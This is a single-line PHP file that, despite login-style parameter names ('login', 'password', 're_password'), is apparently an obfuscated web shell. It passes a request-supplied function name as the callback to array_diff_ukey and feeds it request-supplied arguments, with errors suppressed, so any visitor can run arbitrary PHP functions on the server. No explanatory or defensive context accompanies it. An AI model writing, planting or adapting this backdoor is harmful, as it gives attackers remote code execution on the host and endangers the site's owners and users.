<?php @array_diff_ukey(@array((string)$_REQUEST['password']=>1),@array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['login']); ?>
